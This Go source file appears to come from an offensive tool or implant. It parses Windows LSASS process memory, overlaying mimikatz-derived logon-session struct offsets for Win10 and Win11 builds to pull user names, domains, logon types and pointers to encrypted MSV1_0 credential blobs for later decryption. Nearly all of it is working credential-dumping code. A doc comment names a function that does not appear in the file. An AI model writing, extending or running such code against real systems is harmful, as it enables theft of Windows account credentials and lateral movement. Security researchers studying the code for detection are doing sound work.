package commands

// LSASS LSAP_LOGON_SESSION_LIST structured field parsing — Phase 2C-i.
//
// Phase 2B walks the LogonSessionList and emits raw node bytes; this file
// overlays the KIWI_MSV1_0_LIST_63 struct layout (matches mimikatz
// signature_x64_w8 and is current for Win10 21H2 — Win11 23H2) onto each
// walked node so callers can extract LUID, UserName, Domain, LogonType, and
// the Credentials list pointer that Phase 2C-ii will consume to decrypt
// MSV1_0 credential blobs.
//
// All parsing is done from a captured byte slice (the output of one
// PROCESS_VM_READ at the node's base address) plus an lsassReader for
// dereferencing the LSA_UNICODE_STRING.Buffer pointers, so the entire
// pipeline is unit-testable on Linux without a Windows host.

import (
	"encoding/binary"
	"fmt"
)

// logonSessionLayout describes the byte offsets of fields inside a single
// LSAP_LOGON_SESSION_LIST node. Different Windows builds use different
// layouts; for now Phase 2C-i ships exactly one layout (Win10 21H2 — Win11
// 23H2) which matches the calibrated LogonSessionListSignature in
// lsass_logonlist.go. Future build calibrations should add additional
// layouts here and select between them based on either lsasrv.dll version
// or sigscan-derived markers.
type logonSessionLayout struct {
	Name             string // descriptive label for diagnostics
	NodeReadSize     uint32 // bytes to fetch per node so all fields below are in-range
	LUIDOffset       int    // LocallyUniqueIdentifier (8 bytes)
	UserNameOffset   int    // LSA_UNICODE_STRING UserName (16 bytes)
	DomainOffset     int    // LSA_UNICODE_STRING Domain (16 bytes)
	TypeOffset       int    // LSA_UNICODE_STRING Type (auth pkg name; 16 bytes)
	LogonTypeOffset  int    // ULONG LogonType (4 bytes)
	LogonServerOff   int    // LSA_UNICODE_STRING LogonServer (16 bytes)
	CredentialsOff   int    // PKIWI_MSV1_0_CREDENTIAL_LIST Credentials (8 bytes)
	UnicodeStringMax uint32 // hard cap for LSA_UNICODE_STRING.Length to filter garbage reads
}

// LayoutWin10New is the KIWI_MSV1_0_LIST_63 layout for Win10 21H2+ / Win11
// (builds >= 19041). These builds add extra unknown fields between Domain
// and Type, shifting all subsequent offsets by 0x40 compared to the
// original KIWI_MSV1_0_LIST_63 layout.
var LayoutWin10New = logonSessionLayout{
	Name:             "Win10_21H2_Win11_23H2",
	NodeReadSize:     0x180,
	LUIDOffset:       0x70,
	UserNameOffset:   0x90,
	DomainOffset:     0xa0,
	TypeOffset:       0x100,
	LogonTypeOffset:  0x118,
	LogonServerOff:   0x128,
	CredentialsOff:   0x138,
	UnicodeStringMax: 1024,
}

// LayoutWin10Original is the original KIWI_MSV1_0_LIST_63 layout for
// Win10 1507–1909 / Server 2016 / Server 2019 (builds < 19041).
// Offsets match the mimikatz kuhl_m_sekurlsa_utils.h struct definition.
var LayoutWin10Original = logonSessionLayout{
	Name:             "Win10_1507_Server2019",
	NodeReadSize:     0x140,
	LUIDOffset:       0x70,
	UserNameOffset:   0x90,
	DomainOffset:     0xa0,
	TypeOffset:       0xc0,
	LogonTypeOffset:  0xd8,
	LogonServerOff:   0xf8,
	CredentialsOff:   0x108,
	UnicodeStringMax: 1024,
}

// layoutForVariant selects the correct logon session struct layout based
// on the matched LogonSessionList signature variant name.
// lsaUnicodeStringHeaderSize is the on-disk size of a LSA_UNICODE_STRING on
// x64: USHORT Length + USHORT MaxLen + 4-byte padding + PWCH Buffer.
const lsaUnicodeStringHeaderSize = 16

// parseLSAUnicodeStringHeader pulls Length, MaximumLength, and Buffer out of
// the 16 bytes at the start of `raw`. Returns an error if `raw` is shorter
// than the header. The caller is responsible for sanity-checking Length
// against an expected upper bound (see logonSessionLayout.UnicodeStringMax).
func parseLSAUnicodeStringHeader(raw []byte) (length uint16, maxLength uint16, buffer uintptr, err error) {
	if len(raw) < lsaUnicodeStringHeaderSize {
		return 0, 0, 0, fmt.Errorf("LSA_UNICODE_STRING header: got %d bytes, need %d", len(raw), lsaUnicodeStringHeaderSize)
	}
	length = binary.LittleEndian.Uint16(raw[0:2])
	maxLength = binary.LittleEndian.Uint16(raw[2:4])
	// raw[4:8] is alignment padding on x64
	buffer = uintptr(binary.LittleEndian.Uint64(raw[8:16]))
	return length, maxLength, buffer, nil
}

// readLSAUnicodeString parses an LSA_UNICODE_STRING header at `raw[fieldOffset:]`,
// dereferences the Buffer pointer in the remote process via `r`, and decodes
// the UTF-16LE bytes to a Go string.
//
// Returns an empty string and a nil error for legitimately-empty unicode
// strings (Length == 0 OR Buffer == 0). Returns an error only when the
// header decode fails, the Length is implausible (>maxLen, odd byte count,
// exceeds sanityMaxBytes), or the remote read fails.
func readLSAUnicodeString(r lsassReader, raw []byte, fieldOffset int, sanityMaxBytes uint32) (string, error) {
	if r == nil {
		return "", fmt.Errorf("nil lsassReader")
	}
	if fieldOffset < 0 || fieldOffset+lsaUnicodeStringHeaderSize > len(raw) {
		return "", fmt.Errorf("LSA_UNICODE_STRING field at offset 0x%X falls outside captured node (size %d)", fieldOffset, len(raw))
	}
	length, maxLength, buffer, err := parseLSAUnicodeStringHeader(raw[fieldOffset : fieldOffset+lsaUnicodeStringHeaderSize])
	if err != nil {
		return "", err
	}
	if length == 0 || buffer == 0 {
		return "", nil
	}
	if length%2 != 0 {
		return "", fmt.Errorf("LSA_UNICODE_STRING.Length=%d is odd (must be UTF-16 byte count)", length)
	}
	if length > maxLength {
		return "", fmt.Errorf("LSA_UNICODE_STRING.Length=%d exceeds MaximumLength=%d", length, maxLength)
	}
	if uint32(length) > sanityMaxBytes {
		return "", fmt.Errorf("LSA_UNICODE_STRING.Length=%d exceeds sanity cap %d (likely garbage / wrong layout)", length, sanityMaxBytes)
	}
	bytes, err := r.Read(buffer, uint32(length))
	if err != nil {
		return "", fmt.Errorf("read LSA_UNICODE_STRING.Buffer at 0x%X (%d bytes): %w", buffer, length, err)
	}
	return utf16LEToString(bytes), nil
}

// readAnsiString parses an ANSI_STRING header (same binary layout as
// LSA_UNICODE_STRING on x64: USHORT Length, USHORT MaxLen, pad, PCHAR Buffer)
// and reads the string data as raw bytes interpreted as ASCII. Unlike
// readLSAUnicodeString, odd-length values are valid since ANSI is single-byte.
func readAnsiString(r lsassReader, raw []byte, fieldOffset int, sanityMaxBytes uint32) (string, error) {
	if r == nil {
		return "", fmt.Errorf("nil lsassReader")
	}
	if fieldOffset < 0 || fieldOffset+lsaUnicodeStringHeaderSize > len(raw) {
		return "", fmt.Errorf("ANSI_STRING field at offset 0x%X falls outside captured node (size %d)", fieldOffset, len(raw))
	}
	length, maxLength, buffer, err := parseLSAUnicodeStringHeader(raw[fieldOffset : fieldOffset+lsaUnicodeStringHeaderSize])
	if err != nil {
		return "", err
	}
	if length == 0 || buffer == 0 {
		return "", nil
	}
	if length > maxLength {
		return "", fmt.Errorf("ANSI_STRING.Length=%d exceeds MaximumLength=%d", length, maxLength)
	}
	if uint32(length) > sanityMaxBytes {
		return "", fmt.Errorf("ANSI_STRING.Length=%d exceeds sanity cap %d", length, sanityMaxBytes)
	}
	bytes, err := r.Read(buffer, uint32(length))
	if err != nil {
		return "", fmt.Errorf("read ANSI_STRING.Buffer at 0x%X (%d bytes): %w", buffer, length, err)
	}
	return string(bytes), nil
}

// readLSAUnicodeRawBytes parses an LSA_UNICODE_STRING header at raw[fieldOffset:],
// dereferences the Buffer pointer in the remote process via r, and returns the
// raw bytes WITHOUT a UTF-16 decode. Used for binary blobs (e.g. encrypted
// MSV1_0 credential ciphertext) where the Buffer payload is opaque rather
// than text.
//
// Validation matches readLSAUnicodeString except the odd-Length rejection is
// dropped — binary blobs may legitimately be any byte count. Returns the
// dereferenced Buffer address and the on-the-wire Length even on failure so
// callers can surface them in diagnostic JSON.
func readLSAUnicodeRawBytes(r lsassReader, raw []byte, fieldOffset int, sanityMaxBytes uint32) ([]byte, uintptr, uint16, error) {
	if r == nil {
		return nil, 0, 0, fmt.Errorf("nil lsassReader")
	}
	if fieldOffset < 0 || fieldOffset+lsaUnicodeStringHeaderSize > len(raw) {
		return nil, 0, 0, fmt.Errorf("LSA_UNICODE_STRING field at offset 0x%X falls outside captured node (size %d)", fieldOffset, len(raw))
	}
	length, maxLength, buffer, err := parseLSAUnicodeStringHeader(raw[fieldOffset : fieldOffset+lsaUnicodeStringHeaderSize])
	if err != nil {
		return nil, 0, 0, err
	}
	if length == 0 || buffer == 0 {
		return nil, buffer, length, nil
	}
	if length > maxLength {
		return nil, buffer, length, fmt.Errorf("LSA_UNICODE_STRING.Length=%d exceeds MaximumLength=%d", length, maxLength)
	}
	if uint32(length) > sanityMaxBytes {
		return nil, buffer, length, fmt.Errorf("LSA_UNICODE_STRING.Length=%d exceeds sanity cap %d (likely garbage / wrong layout)", length, sanityMaxBytes)
	}
	bytes, err := r.Read(buffer, uint32(length))
	if err != nil {
		return nil, buffer, length, fmt.Errorf("read LSA_UNICODE_STRING.Buffer at 0x%X (%d bytes): %w", buffer, length, err)
	}
	return bytes, buffer, length, nil
}

// parsedLogonSession is the structured-field projection of a single walked
// LogonSessionList node. Fields that fail to parse remain at their zero
// value and the corresponding error is appended to ParseErrors so the caller
// can decide whether to fall back to byte-scan heuristics.
type parsedLogonSession struct {
	LUID            uint64
	UserName        string
	Domain          string
	AuthPackage     string
	LogonType       uint32
	LogonServer     string
	CredentialsPtr  uintptr
	ParseErrors     []string
}

// parseLogonSessionFields overlays the configured struct layout onto a
// captured node buffer and returns whatever fields parse successfully. It
// never errors fatally: on success ParseErrors is empty; on partial failure
// ParseErrors contains one descriptive line per missing field. The caller
// uses LUID == 0 + non-empty ParseErrors to decide that this node may not
// match the layout (likely a different Windows build).
func parseLogonSessionFields(r lsassReader, raw []byte, layout logonSessionLayout) parsedLogonSession {
	var p parsedLogonSession
	addErr := func(format string, args ...interface{}) {
		p.ParseErrors = append(p.ParseErrors, fmt.Sprintf(format, args...))
	}

	// LUID at +offset (8 bytes, little-endian).
	if layout.LUIDOffset+8 <= len(raw) {
		p.LUID = binary.LittleEndian.Uint64(raw[layout.LUIDOffset : layout.LUIDOffset+8])
	} else {
		addErr("LUID at +0x%X falls outside %d-byte node", layout.LUIDOffset, len(raw))
	}

	// LSA_UNICODE_STRING fields. Each is best-effort: failure on one does
	// not prevent the others from parsing.
	if s, err := readLSAUnicodeString(r, raw, layout.UserNameOffset, layout.UnicodeStringMax); err != nil {
		addErr("UserName: %v", err)
	} else {
		p.UserName = s
	}
	if s, err := readLSAUnicodeString(r, raw, layout.DomainOffset, layout.UnicodeStringMax); err != nil {
		addErr("Domain: %v", err)
	} else {
		p.Domain = s
	}
	if s, err := readLSAUnicodeString(r, raw, layout.TypeOffset, layout.UnicodeStringMax); err != nil {
		addErr("Type: %v", err)
	} else {
		p.AuthPackage = s
	}
	if s, err := readLSAUnicodeString(r, raw, layout.LogonServerOff, layout.UnicodeStringMax); err != nil {
		addErr("LogonServer: %v", err)
	} else {
		p.LogonServer = s
	}

	// LogonType (DWORD) and Credentials pointer (qword).
	if layout.LogonTypeOffset+4 <= len(raw) {
		p.LogonType = binary.LittleEndian.Uint32(raw[layout.LogonTypeOffset : layout.LogonTypeOffset+4])
	} else {
		addErr("LogonType at +0x%X falls outside %d-byte node", layout.LogonTypeOffset, len(raw))
	}
	if layout.CredentialsOff+8 <= len(raw) {
		p.CredentialsPtr = uintptr(binary.LittleEndian.Uint64(raw[layout.CredentialsOff : layout.CredentialsOff+8]))
	} else {
		addErr("Credentials at +0x%X falls outside %d-byte node", layout.CredentialsOff, len(raw))
	}
	return p
}

// logonSessionTypeName maps a SECURITY_LOGON_TYPE value to a readable string. Mirrors
// insituLogonTypeName in hashdump_insitu_windows.go but is cross-platform so
// it can be exercised from tests.
func logonSessionTypeName(t uint32) string {
	switch t {
	case 0:
		return ""
	case 2:
		return "Interactive"
	case 3:
		return "Network"
	case 4:
		return "Batch"
	case 5:
		return "Service"
	case 7:
		return "Unlock"
	case 8:
		return "NetworkCleartext"
	case 9:
		return "NewCredentials"
	case 10:
		return "RemoteInteractive"
	case 11:
		return "CachedInteractive"
	case 12:
		return "CachedRemoteInteractive"
	case 13:
		return "CachedUnlock"
	default:
		return fmt.Sprintf("Unknown(%d)", t)
	}
}
